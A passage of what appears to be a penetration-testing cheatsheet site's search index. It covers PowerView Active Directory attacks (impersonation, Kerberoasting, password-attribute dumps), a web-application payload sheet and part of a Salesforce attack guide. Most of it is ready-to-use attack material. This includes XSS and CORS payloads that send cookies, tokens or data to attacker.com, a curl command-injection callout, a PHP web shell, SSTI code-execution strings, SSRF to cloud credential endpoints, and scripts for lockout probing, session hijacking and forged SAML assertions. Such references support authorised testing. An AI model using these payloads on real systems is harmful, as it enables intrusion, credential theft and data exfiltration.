'Password123!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a',$SecPassword); Invoke-UserImpersonation -Credential $Cred\n</code></pre> - Revert impersonation back to self. <pre><code>Invoke-RevertToSelf\n</code></pre></p> <p>Object outliers, setters, ownership - Detect outlier properties across computer objects. <pre><code>Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier\n</code></pre> - Set arbitrary attributes on an AD object. <pre><code>Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\\\EVIL\\program.exe'} -Verbose\n</code></pre> - Take or set ownership of an AD object. <pre><code>Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y\n</code></pre></p> <p>Kerberoasting and AS-REP roast - Kerberoast using defaults (prints TGS hashes). <pre><code>Invoke-Kerberoast\n</code></pre> - Kerberoast a specific account, Hashcat format. <pre><code>Invoke-Kerberoast -Identity \"svc_sql\" -OutputFormat Hashcat\n</code></pre> - Kerberoast scoped to a specific OU/SearchBase. <pre><code>Invoke-Kerberoast -SearchBase \"LDAP://OU=secret,DC=testlab,DC=local\" -OutputFormat Hashcat\n</code></pre> - List AS-REP roastable users (no preauth). <pre><code>Get-DomainUser -PreauthNotRequired | Select-Object samaccountname\n</code></pre> - Request AS-REP roast for a specific user. <pre><code>Invoke-ASREPRoast -UserName jdoe -Verbose\n</code></pre></p> <p>Local admin reachability - Threaded probe to find where you\u2019re local admin (SMB/RPC). <pre><code>Find-LocalAdminAccess\n</code></pre> - Test admin access to a single host. <pre><code>Test-AdminAccess -ComputerName WS01\n</code></pre></p> <p>Turn short names into FQDNs via GC - Resolve bare hostnames to FQDNs using the global catalog. <pre><code>gc .\\computers.txt | % { Get-DomainComputer -SearchBase \"GC://GLOBAL.CATALOG\" -LDAP \"(name=$_) \" -Properties dnshostname }\n</code></pre></p> <p>Data export/import - Export objects to XML for offline analysis. <pre><code>Get-DomainUser | Export-Clixml .\\users.xml\n</code></pre> - Re-import exported PowerView objects. <pre><code>$Users = Import-Clixml .\\users.xml\n</code></pre></p> <p>Password attribute probe (rare, but occasionally exposed) - Dump userPassword attribute (if present) and render ASCII. <pre><code>$FormatEnumerationLimit=-1; Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % { Add-Member -InputObject $_ NoteProperty 'Password' \"$([System.Text.Encoding]::ASCII.GetString($_.userPassword))\" -PassThru } | fl\n</code></pre></p> <p>Common pipelines and counts - Count total domain users quickly. <pre><code>(Get-DomainUser).Count\n</code></pre> - Find non-empty user description fields. <pre><code>Get-DomainUser -Properties samaccountname,description | ? { $_.description -ne $null }\n</code></pre></p> <p>Process enumeration (not a PowerView function) PowerView 3.x has no Get-NetProcess; use native remoting/WMI/CIM: - Get processes on a remote host via WinRM (PowerShell remoting). <pre><code>Invoke-Command -ComputerName WS01 -ScriptBlock { Get-Process } -Credential $Cred\n</code></pre> - Query processes via CIM (WSMan) on a remote host. <pre><code>Get-CimInstance Win32_Process -ComputerName WS01 -Credential $Cred\n</code></pre> - Query processes via legacy WMI (DCOM) on a remote host. <pre><code>Get-WmiObject Win32_Process -ComputerName WS01 -Credential $Cred\n</code></pre></p>"},{"location":"Cheatsheets/SQLMap/","title":"SQLMap","text":"<p>Useful flags: <pre><code>--batch will answer the default the questons automatically\n--level\n--risk\n-T\n-D\n--dump\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/","title":"WebApp","text":""},{"location":"Cheatsheets/WebApp/#reconnaissance","title":"RECONNAISSANCE","text":"<p>Present on: All web applications</p> <p>Manual: Browser dev tools, view source, directory guessing Automated: <pre><code>subfinder -d target.com | httpx -silent\nffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ\nnuclei -u target.com -t technologies/\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#authentication-bypass","title":"AUTHENTICATION BYPASS","text":"<p>Present when: Poor auth implementation, weak validation logic</p> <p>Manual: Try default creds, manipulate login flow, check session handling Automated: <pre><code>hydra -L users.txt -P pass.txt target.com http-post-form\nffuf -w creds.txt -u target.com/login -X POST -d \"user=FUZZ&amp;pass=FUZZ\"\n</code></pre></p> <p>Exploit: <pre><code>' OR 1=1--\nadmin'--\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#sql-injection","title":"SQL INJECTION","text":"<p>Present when: User input directly concatenated into SQL queries Detailed cheatsheet: SQL Injection</p> <p>Manual: Add <code>'</code> to parameters, observe errors, test time delays Automated: <pre><code>sqlmap -u \"target.com/page?id=1\" --batch --dbs\nghauri -u \"target.com/page?id=1\"\n</code></pre></p> <p>Exploit: <pre><code># Detection\n' OR SLEEP(5)--\n' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\n\n# Extraction\n' UNION SELECT 1,version(),database()--\n' UNION SELECT 1,load_file('/etc/passwd'),3--\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#xss","title":"XSS","text":"<p>Present when: User input reflected in HTML without proper encoding Also see Cross-Site Scripting (XSS) Manual: Insert <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in all inputs, check response Automated: <pre><code>xsser --url=\"target.com/search?q=\" -p\nnuclei -u target.com -t xss/\ndalfox url target.com\n</code></pre></p> <p>Exploit: <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n&lt;img src=x onerror=fetch('//attacker.com/'+document.cookie)&gt;\n&lt;svg onload=location='//attacker.com/?'+localStorage.getItem('token')&gt;\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#command-injection","title":"COMMAND INJECTION","text":"<p>Present when: User input passed to system commands without sanitization Also see: Command Injection Manual: Test with <code>;</code>, <code>&amp;&amp;</code>, <code>|</code> followed by commands like <code>whoami</code> Automated: <pre><code>commix --url=\"target.com/ping?host=127.0.0.1\"\nnuclei -u target.com -t command-injection/\n</code></pre></p> <p>Exploit: <pre><code>; whoami\n&amp;&amp; id\n| cat /etc/passwd\n`curl attacker.com/$(whoami)`\n$(nslookup whoami.attacker.com)\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#file-upload","title":"FILE UPLOAD","text":"<p>Present when: File uploads lack proper validation and execution prevention Also see: Insecure File Uploads Manual: Upload various file types, check execution in upload directory Automated: <pre><code>fuxploider --url target.com/upload\nnuclei -u target.com -t file-upload/\n</code></pre></p> <p>Exploit: <pre><code># Shell upload\nshell.php: &lt;?php system($_GET['cmd']); ?&gt;\n\n# Bypass techniques\nshell.php%00.jpg\nshell.Php\nshell.phtml\nGIF89a;&lt;?php system($_GET['cmd']);?&gt;\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#ssrf","title":"SSRF","text":"<p>Present when: Application makes requests to user-controlled URLs</p> <p>Manual: Replace URLs with internal IPs, cloud metadata endpoints Automated: <pre><code>ssrfmap -r request.txt -p url -m readfiles\nnuclei -u target.com -t ssrf/\n</code></pre></p> <p>Exploit: <pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://127.0.0.1:8080/admin\nfile:///etc/passwd\ngopher://127.0.0.1:6379/_SET test 1\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#ssti","title":"SSTI","text":"<p>Present when: User input embedded in template engines without sandboxing Also see: Server-Side Template Injection (SSTI) Manual: Test with <code>{{7*7}}</code>, <code>${7*7}</code>, observe if calculation occurs Automated: <pre><code>tplmap -u \"target.com/page?name=test\"\nnuclei -u target.com -t ssti/\n</code></pre></p> <p>Exploit: <pre><code># Jinja2\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# Twig\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n\n# Freemarker\n&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt; ${ ex(\"id\") }\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#path-traversallfi","title":"PATH TRAVERSAL/LFI","text":"<p>Present when: File paths constructed from user input without validation Also see: Local File Inclusion (LFI) Manual: Replace filenames with <code>../../../etc/passwd</code>, observe responses Automated: <pre><code>dotdotpwn -m http -h target.com -x 8080 -f /etc/passwd\nnuclei -u target.com -t lfi/\n</code></pre></p> <p>Exploit: <pre><code>../../../etc/passwd\n....//....//....//etc/passwd\nphp://filter/convert.base64-encode/resource=config.php\nphp://input (with POST: &lt;?php system($_GET['cmd']);?&gt;)\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#insecure-deserialization","title":"INSECURE DESERIALIZATION","text":"<p>Present when: Untrusted serialized objects are deserialized</p> <p>Manual: Look for base64/hex blobs in cookies, \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440s; decode and analyze Automated: <pre><code>ysoserial -p CommonsCollections1 -c 'id'\nphpggc -l # List gadgets\n</code></pre></p> <p>Exploit: <pre><code># Java\njava -jar ysoserial.jar CommonsCollections1 'id' | base64\n\n# PHP\nphpggc Laravel/RCE1 system id | base64\n\n# .NET\nysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c \"calc\"\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#idor","title":"IDOR","text":"<p>Present when: Object IDs in URLs/parameters lack proper authorization checks Also see: Insecure Direct Object Reference (IDOR) Manual: Change numeric IDs, UUIDs, usernames in parameters Automated: <pre><code>ffuf -w numbers.txt -u target.com/user/FUZZ -fc 404\nauthz0 -u target.com -H \"Cookie: session=abc\"\n</code></pre></p> <p>Exploit: <pre><code>/user/profile?id=1 \u2192 id=2\n/api/document/ABC123 \u2192 ABC124\n/order/user123 \u2192 user456\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#http-request-smuggling","title":"HTTP REQUEST SMUGGLING","text":"<p>Present when: Frontend/backend servers parse HTTP requests differently</p> <p>Manual: Send conflicting Content-Length/Transfer-Encoding headers Automated: <pre><code>smuggler.py -u target.com\nhttpreqsmuggler target.com\n</code></pre></p> <p>Exploit: <pre><code># CL.TE\nPOST / HTTP/1.1\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#business-logic-flaws","title":"BUSINESS LOGIC FLAWS","text":"<p>Present when: Application workflow can be manipulated for unintended outcomes</p> <p>Manual: Skip steps, negative values, race conditions, replay attacks Automated: <pre><code># Race condition testing\nffuf -w numbers.txt -u target.com/transfer -X POST -d \"amount=1000\" -t 50\n</code></pre></p> <p>Exploit: <pre><code>{\"price\": -100}\n{\"quantity\": -1}\n{\"role\": \"admin\"}\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#cache-poisoning","title":"CACHE POISONING","text":"<p>Present when: Web caches store responses based on manipulable headers</p> <p>Manual: Modify Host header, X-Forwarded-Host, observe cached responses Automated: <pre><code>web-cache-vulnerability-scanner -u target.com\nparam-miner --target target.com\n</code></pre></p> <p>Exploit: <pre><code>GET / HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#cors-misconfiguration","title":"CORS MISCONFIGURATION","text":"<p>Present when: Access-Control headers are overly permissive</p> <p>Manual: Check if Origin reflects in Access-Control-Allow-Origin Automated: <pre><code>corsy -u target.com\nnuclei -u target.com -t cors/\n</code></pre></p> <p>Exploit: <pre><code>// If ACAO: * with credentials\nfetch('https://target.com/api/sensitive', {credentials: 'include'})\n.then(r=&gt;r.text()).then(d=&gt;fetch('//attacker.com?data='+btoa(d)))\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#open-redirect","title":"OPEN REDIRECT","text":"<p>Present when: Redirect destinations come from untrusted user input</p> <p>Manual: Modify redirect parameters to external domains Automated: <pre><code>openredirex -l urls.txt\nnuclei -u target.com -t redirect/\n</code></pre></p> <p>Exploit: <pre><code>?redirect=//evil.com\n?url=https://evil.com\n?next=/\\evil.com\n?return_to=//evil.com%2e.target.com\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#clickjacking","title":"CLICKJACKING","text":"<p>Present when: X-Frame-Options/CSP frame-ancestors missing</p> <p>Manual: Check response headers for frame protection Automated: <pre><code>clickjacker -u target.com\nnuclei -u target.com -t clickjacking/\n</code></pre></p> <p>Exploit: <pre><code>&lt;iframe src=\"https://target.com/admin/delete?id=123\" style=\"opacity:0.1\"&gt;&lt;/iframe&gt;\n&lt;div style=\"position:absolute;\"&gt;CLICK HERE FOR FREE MONEY!&lt;/div&gt;\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#csrf-cross-site-request-forgery","title":"CSRF (CROSS-SITE REQUEST FORGERY)","text":"<p>Present when: State-changing requests lack proper anti-CSRF tokens Cross-Site Request Forgery (CSRF) Manual: Remove CSRF tokens, check if requests still work Automated: <pre><code>xsrfprobe -u target.com\nburp csrf scanner extension\n</code></pre></p> <p>Exploit: <pre><code>&lt;form action=\"https://target.com/transfer\" method=\"POST\"&gt;\n&lt;input name=\"to\" value=\"attacker\"&gt;\n&lt;input name=\"amount\" value=\"1000\"&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit()&lt;/script&gt;\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#subdomain-takeover","title":"SUBDOMAIN TAKEOVER","text":"<p>Present when: DNS points to unclaimed cloud services</p> <p>Manual: Check CNAME records, try claiming the service Automated: <pre><code>subjack -w subdomains.txt -t 100 -timeout 30\nnuclei -u target.com -t takeovers/\n</code></pre></p> <p>Exploit: <pre><code># If CNAME points to unclaimed service\ndig subdomain.target.com\n# If points to xxx.github.io - claim that GitHub pages\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#jwt-vulnerabilities","title":"JWT VULNERABILITIES","text":"<p>Present when: JSON Web Tokens lack proper validation</p> <p>Manual: Decode JWT, modify payload/header, test none algorithm Automated: <pre><code>jwt_tool token.jwt -C -d wordlist.txt\njwttool.py -t token.jwt\n</code></pre></p> <p>Exploit: <pre><code># None algorithm\n{\"alg\":\"none\",\"typ\":\"JWT\"}\n\n# Algorithm confusion\njwt_tool token.jwt -X k -pk public.pem\n\n# Weak secret\njwt_tool token.jwt -C -d rockyou.txt\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#graphql-injection","title":"GRAPHQL INJECTION","text":"<p>Present when: GraphQL endpoints lack proper input validation</p> <p>Manual: Send malformed queries, introspection queries Automated: <pre><code>graphql-cop -t target.com/graphql\nnuclei -u target.com -t graphql/\n</code></pre></p> <p>Exploit: <pre><code># Introspection\n{__schema{types{name fields{name type{name}}}}}\n\n# Injection\n{user(id: \"1' OR 1=1--\") {name email}}\n\n# DoS\nquery {users(first: 99999999) {name}}\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#websocket-vulnerabilities","title":"WEBSOCKET VULNERABILITIES","text":"<p>Present when: WebSocket connections lack proper authentication/validation</p> <p>Manual: Connect to WebSocket, send malformed/privileged messages Automated: <pre><code>websocket-harness -u ws://target.com/ws\nwsrecon target.com\n</code></pre></p> <p>Exploit: <pre><code>ws = new WebSocket(\"ws://target.com/ws\");\nws.send('{\"action\":\"admin\",\"cmd\":\"delete_user\",\"id\":\"victim\"}');\n</code></pre></p>"},{"location":"Cheatsheets/WebApp/#quick-identification-checklist","title":"QUICK IDENTIFICATION CHECKLIST","text":"<pre><code># Immediate checks\ncurl -k https://target.com/robots.txt\ncurl -k https://target.com/.git/config  \ncurl -k https://target.com/admin\ncurl -k -H \"Host: evil.com\" https://target.com\n\n# Quick tests\necho '\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;' # XSS\necho \"' OR 1=1--\" # SQL\necho \"../../../etc/passwd\" # LFI\n</code></pre>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/","title":"Salesforce   1","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Pre-Engagement Setup</li> <li>Reconnaissance &amp; Intelligence Gathering</li> <li>Authentication Security Assessment</li> <li>Authorization &amp; Access Control Testing</li> <li>Data Security Evaluation</li> <li>Custom Code Security Analysis</li> <li>Platform Configuration Security</li> <li>API Security Testing</li> <li>Integration Security Assessment</li> <li>Advanced Attack Vectors</li> <li>Post-Exploitation &amp; Persistence</li> <li>Detection Evasion</li> <li>Reporting &amp; Evidence Collection</li> </ol>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#pre-engagement-setup","title":"Pre-Engagement Setup","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#essential-tools","title":"Essential Tools","text":"<ul> <li>Salesforce CLI (sfdx): Metadata manipulation and org access</li> <li>Burp Suite Professional: API interception and manipulation</li> <li>Salesforce Inspector: Browser extension for metadata exploration</li> <li>Postman: API testing and automation</li> <li>PMD with Apex Rules: Static code analysis</li> <li>simple_salesforce (Python): Automated API testing</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#initial-access-validation","title":"Initial Access Validation","text":"<pre><code>-- Verify current user context\nSELECT Id, Username, Profile.Name, UserRole.Name, \n       Profile.PermissionsModifyAllData, Profile.PermissionsViewAllData\nFROM User WHERE Id = :UserInfo.getUserId()\n\n-- Check organization details\nSELECT Id, Name, OrganizationType, InstanceName, IsSandbox, Edition\nFROM Organization\n</code></pre>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#reconnaissance-intelligence-gathering","title":"Reconnaissance &amp; Intelligence Gathering","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-salesforce-instance-discovery","title":"1. Salesforce Instance Discovery","text":"<p>Objective: Identify all Salesforce instances and public attack surfaces.</p> <p>Methods: <pre><code># Subdomain enumeration\nsubfinder -d target.com | grep -E \"(salesforce|force|lightning|my\\.salesforce)\"\namass enum -passive -d target.com | grep -E \"(salesforce|force|lightning)\"\n\n# Certificate transparency analysis\ncurl -s \"https://crt.sh/?q=%.target.com&amp;output=json\" | jq -r '.[].name_value' | grep -E \"(salesforce|force|lightning)\"\n\n# DNS enumeration\ndig TXT target.com | grep -i salesforce\ndig CNAME www.target.com | grep -i salesforce\n</code></pre></p> <p>Impact: Reveals additional attack surfaces and potential shadow IT implementations.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-organization-metadata-enumeration","title":"2. Organization Metadata Enumeration","text":"<p>Objective: Gather critical organizational information and identify edition-specific features.</p> <p>SOQL Queries: <pre><code>-- Comprehensive org information\nSELECT Id, Name, OrganizationType, InstanceName, IsSandbox, \n       LanguageLocaleKey, DefaultLocaleSidKey, TimeZoneSidKey, \n       CreatedDate, Edition, TrialExpirationDate\nFROM Organization\n\n-- Feature availability detection\nSELECT Id, FeatureType, Name, ParentId \nFROM Feature WHERE IsEnabled = true\n\n-- License information\nSELECT Id, Name, Status, UsedLicenses, TotalLicenses, LicenseDefinitionKey\nFROM UserLicense\n\n-- API version capabilities\nSELECT Id, VersionNumber, Status, ReleaseDate\nFROM ApiVersion ORDER BY VersionNumber DESC\n</code></pre></p> <p>Impact: Understanding platform capabilities and limitations for targeted attack planning.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-user-role-intelligence","title":"3. User &amp; Role Intelligence","text":"<p>Objective: Map organizational hierarchy and identify high-value targets.</p> <p>SOQL Queries: <pre><code>-- Comprehensive user enumeration\nSELECT Id, Username, Email, Name, Title, Department, Division, \n       IsActive, LastLoginDate, LastPasswordChangeDate, \n       Profile.Name, UserRole.Name, UserType, CreatedDate,\n       NumberOfFailedLogins, PasswordNeverExpires\nFROM User \nORDER BY LastLoginDate DESC NULLS LAST\n\n-- Administrative user identification\nSELECT Id, Username, Email, Name, Profile.Name, UserRole.Name, \n       LastLoginDate, IsActive, CreatedDate\nFROM User \nWHERE Profile.Name IN ('System Administrator', 'System Administrator Light') \n   OR Profile.PermissionsModifyAllData = true \n   OR Profile.PermissionsViewAllData = true\n\n-- External and partner users\nSELECT Id, Username, Email, UserType, ContactId, AccountId, \n       IsActive, LastLoginDate, CreatedDate\nFROM User \nWHERE UserType IN ('PowerPartner', 'PowerCustomerSuccess', \n                  'CustomerSuccess', 'Partner', 'Guest', 'CspLitePortal')\n\n-- Recently created users (potential backdoors)\nSELECT Id, Username, Email, Name, CreatedDate, CreatedBy.Name, \n       IsActive, LastLoginDate\nFROM User \nWHERE CreatedDate = LAST_N_DAYS:30 \nORDER BY CreatedDate DESC\n\n-- Service accounts identification\nSELECT Id, Username, Email, Name, IsActive, LastLoginDate, CreatedDate\nFROM User \nWHERE (Name LIKE '%service%' OR Name LIKE '%integration%' \n    OR Name LIKE '%api%' OR Username LIKE '%service%' \n    OR Username LIKE '%integration%' OR Username LIKE '%api%')\n</code></pre></p> <p>Impact: Identifies high-value targets for social engineering and credential attacks.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#4-custom-code-object-discovery","title":"4. Custom Code &amp; Object Discovery","text":"<p>Objective: Enumerate custom attack surface including Apex, Visualforce, and Lightning components.</p> <p>SOQL Queries: <pre><code>-- Custom objects\nSELECT QualifiedApiName, Label, PluralLabel, IsCustomizable, \n       KeyPrefix, RecordTypesSupported\nFROM EntityDefinition \nWHERE IsCustomizable = true AND NamespacePrefix = null\n\n-- Apex classes\nSELECT Id, Name, Body, LengthWithoutComments, ApiVersion, \n       CreatedDate, CreatedBy.Name, LastModifiedDate, \n       LastModifiedBy.Name, Status, NamespacePrefix\nFROM ApexClass \nWHERE Status = 'Active' AND NamespacePrefix = null\n\n-- Apex triggers\nSELECT Id, Name, TableEnumOrId, Body, ApiVersion, Status,\n       UsageBeforeInsert, UsageAfterInsert, UsageBeforeUpdate, \n       UsageAfterUpdate, UsageBeforeDelete, UsageAfterDelete\nFROM ApexTrigger \nWHERE Status = 'Active'\n\n-- Visualforce pages\nSELECT Id, Name, Markup, ControllerType, CreatedDate, \n       CreatedBy.Name, LastModifiedDate, IsAvailableInTouch\nFROM ApexPage\n\n-- Lightning components\nSELECT Id, DeveloperName, Description, Source, CreatedDate\nFROM LightningComponentBundle \nWHERE IsDeleted = false\n\n-- REST endpoints\nSELECT Id, DeveloperName, NamespacePrefix, HttpMethods, \n       Description, Status\nFROM RestResource \nWHERE Status = 'Active'\n</code></pre></p> <p>Impact: Identifies custom code that likely contains vulnerabilities absent from standard Salesforce functionality.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#authentication-security-assessment","title":"Authentication Security Assessment","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-password-policy-evaluation","title":"1. Password Policy Evaluation","text":"<p>Objective: Assess password requirements and account lockout policies.</p> <p>Navigation: Setup \u2192 Security \u2192 Password Policies</p> <p>SOQL Query: <pre><code>-- Password policy configuration (if accessible)\nSELECT ComplexityRequirement, MinPasswordLength, PasswordLockoutThreshold,\n       LockoutInterval, MaxPasswordAge, MinPasswordAge,\n       PasswordHistoryRestriction, QuestionRestriction\nFROM PasswordPolicy\n</code></pre></p> <p>Manual Checks: - Minimum password length (\u226512 recommended) - Complexity requirements (uppercase, lowercase, numbers, symbols) - Password history (prevent last 3-5 passwords) - Lockout threshold (\u22645 failed attempts) - Lockout duration (\u226515 minutes)</p> <p>Automated Testing: <pre><code>def test_password_policy_weakness(base_url, username):\n    \"\"\"Test password policy enforcement\"\"\"\n    weak_passwords = [\n        \"password123\", \"123456789\", \"qwerty123\", \n        \"admin123\", \"welcome123\", \"Password1\"\n    ]\n\n    lockout_threshold = 0\n    for password in weak_passwords:\n        response = requests.post(f\"{base_url}/login.jsp\", \n                               data={'username': username, 'pw': password})\n        lockout_threshold += 1\n\n        if \"invalid login\" in response.text.lower():\n            print(f\"Attempt {lockout_threshold}: Weak password rejected\")\n        elif \"locked\" in response.text.lower():\n            print(f\"Account locked after {lockout_threshold} attempts\")\n            break\n\n    return lockout_threshold\n</code></pre></p> <p>Impact: Weak policies enable brute force and credential stuffing attacks.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-multi-factor-authentication-mfa-assessment","title":"2. Multi-Factor Authentication (MFA) Assessment","text":"<p>Objective: Evaluate MFA implementation and identify potential bypasses.</p> <p>SOQL Queries: <pre><code>-- Users without MFA enrolled\nSELECT Id, Username, Email, Name, Profile.Name, LastLoginDate,\n       (SELECT COUNT() FROM TwoFactorInfo WHERE UserId = User.Id) as MFA_Methods\nFROM User \nWHERE IsActive = true \nHAVING MFA_Methods = 0\n\n-- MFA method analysis\nSELECT Id, UserId, User.Username, User.Email, Type, IsActive, \n       CreatedDate, LastUsedDate\nFROM TwoFactorInfo \nORDER BY LastUsedDate DESC NULLS LAST\n\n-- Profile MFA requirements\nSELECT Id, Name, RequiresMfa\nFROM Profile\n\n-- Login flow MFA requirements\nSELECT Id, DeveloperName, UsedForAuthentication, Description\nFROM Flow \nWHERE Type = 'LoginFlow' AND Status = 'Active'\n</code></pre></p> <p>MFA Bypass Testing: <pre><code># Test API access bypass\ncurl -X POST https://instance.salesforce.com/services/oauth2/token \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"grant_type=password&amp;client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;username=USER&amp;password=PASS\"\n\n# Test session fixation\ndocument.cookie = \"sid_Client=fixed_session_value; domain=.salesforce.com; path=/\";\n</code></pre></p> <p>Impact: Users without MFA are vulnerable to account takeover via credential compromise.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-session-security-analysis","title":"3. Session Security Analysis","text":"<p>Objective: Evaluate session management controls and identify session-based vulnerabilities.</p> <p>Navigation: Setup \u2192 Security \u2192 Session Settings</p> <p>Critical Settings: - Session Security Level: High Assurance - Lock sessions to IP address: Enabled - Lock sessions to domain: Enabled - Disable concurrent sessions: Enabled - Session timeout: \u22642 hours - Force logout on timeout: Enabled</p> <p>Session Testing: <pre><code>def test_session_hijacking(original_session, target_ip):\n    \"\"\"Test session hijacking from different IP\"\"\"\n    headers = {\n        'Cookie': f'sid_Client={original_session}',\n        'X-Forwarded-For': target_ip,\n        'User-Agent': 'AttackerAgent/1.0'\n    }\n\n    response = requests.get(\n        'https://instance.salesforce.com/home/home.jsp',\n        headers=headers\n    )\n\n    if response.status_code == 200:\n        print(\"Session hijacking successful - IP locking not implemented\")\n    else:\n        print(\"Session hijacking failed - IP locking active\")\n</code></pre></p> <p>CSRF Testing: <pre><code>&lt;!-- CSRF test payload --&gt;\n&lt;form action=\"https://instance.salesforce.com/setup/own/users.jsp\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"save\" value=\"1\"&gt;\n    &lt;input type=\"hidden\" name=\"id\" value=\"005XX000001b0Qw\"&gt;\n    &lt;input type=\"hidden\" name=\"IsActive\" value=\"false\"&gt;\n    &lt;input type=\"submit\" value=\"Disable User Account\"&gt;\n&lt;/form&gt;\n</code></pre></p> <p>Impact: Weak session controls enable session hijacking and CSRF attacks.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#4-single-sign-on-sso-security","title":"4. Single Sign-On (SSO) Security","text":"<p>Objective: Evaluate SSO implementation for security weaknesses and potential bypasses.</p> <p>SOQL Queries: <pre><code>-- SAML SSO settings\nSELECT Id, Name, Issuer, EntityId, IdentityLocation, \n       IdentityMapping, AttributeFormat, OptionsSpInitBinding\nFROM SamlSsoConfig\n\n-- Connected apps with SSO\nSELECT Id, Name, CallbackUrl, ConsumerKey, UsePkce, \n       OptionsFullScopeApprovals, OptionsRefreshTokenValidityMetric\nFROM ConnectedApplication \nWHERE CallbackUrl LIKE '%saml%' OR CallbackUrl LIKE '%sso%'\n</code></pre></p> <p>SAML Response Manipulation: <pre><code>&lt;!-- Test SAML assertion tampering --&gt;\n&lt;saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"&gt;\n    &lt;saml:Subject&gt;\n        &lt;saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\"&gt;\n            admin@target.com &lt;!-- Privilege escalation attempt --&gt;\n        &lt;/saml:NameID&gt;\n    &lt;/saml:Subject&gt;\n    &lt;saml:AttributeStatement&gt;\n        &lt;saml:Attribute Name=\"Profile\"&gt;\n            &lt;saml:AttributeValue&gt;System Administrator&lt;/saml:AttributeValue&gt;\n        &lt;/saml:Attribute&gt;\n    &lt;/saml:AttributeStatement&gt;\n&lt;/saml:Assertion&gt;\n</code></pre></p> <p>SSO Bypass Testing: <pre><code># Test direct login bypass\ncurl -X POST https://instance.salesforce.com/login.jsp \\\n  -d \"username=user@domain.com&amp;pw=password\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\"\n</code></pre></p> <p>Impact: SSO vulnerabilities can lead to authentication bypass and privilege escalation.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#authorization-access-control-testing","title":"Authorization &amp; Access Control Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-profile-permission-analysis","title":"1. Profile &amp; Permission Analysis","text":"<p>Objective: Identify privilege escalation opportunities and excessive permissions.</p> <p>High-Privilege Discovery: <pre><code>-- System administrators and equivalent users\nSELECT Id, Username, Email, Name, Profile.Name, UserRole.Name, \n       IsActive, LastLoginDate, CreatedDate,\n       Profile.PermissionsModifyAllData, Profile.PermissionsViewAllData,\n       Profile.PermissionsManageUsers, Profile.PermissionsCustomizeApplication\nFROM User \nWHERE Profile.PermissionsModifyAllData = true \n   OR Profile.PermissionsViewAllData = true \n   OR Profile.PermissionsManageUsers = true\n   OR Profile.PermissionsCustomizeApplication = true\nORDER BY LastLoginDate DESC NULLS LAST\n\n-- Dangerous permission combinations\nSELECT Id, Username, Profile.Name,\n       Profile.PermissionsModifyAllData as ModifyAll,\n       Profile.PermissionsViewAllData as ViewAll,\n       Profile.PermissionsManageUsers as ManageUsers,\n       Profile.PermissionsCustomizeApplication as CustomizeApp,\n       Profile.PermissionsApiEnabled as ApiEnabled\nFROM User \nWHERE 